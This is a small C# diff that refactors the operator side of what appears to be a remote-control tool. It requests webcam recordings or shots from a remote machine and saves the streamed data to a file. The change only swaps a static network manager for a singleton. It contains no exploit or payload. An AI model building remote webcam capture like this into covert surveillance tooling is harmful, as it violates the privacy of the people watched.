@@ -3,6 +3,7 @@ using Master.Commands.Core;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using Master.Core;
 
 namespace Webcam_master
 {
@@ -24,7 +25,7 @@ namespace Webcam_master
         {
             var fileName = args[1];
 
-            var result = MasterCommandsManager.networkManager.ReadLine();
+            var result = MasterNetworkManager.GetInstance().ReadLine();
 
             if (result != "OK")
             {
@@ -39,14 +40,14 @@ namespace Webcam_master
             {
                 Console.Write("Press [ENTER] to stop the recording... ");
                 Console.ReadLine();
-                MasterCommandsManager.networkManager.WriteLine("STOP");
+                MasterNetworkManager.GetInstance().WriteLine("STOP");
             }
 
             try
             {
                 using (var fs = new FileStream(fileName, FileMode.Create))
                 {
-                    MasterCommandsManager.networkManager.NetworkStreamToStream(fs);
+                    MasterNetworkManager.GetInstance().NetworkStreamToStream(fs);
                 }
 
                 ColorTools.WriteCommandSuccess($"{(args[0] == "video" ? "Video" : "Webcam shot")} saved : {fileName}");
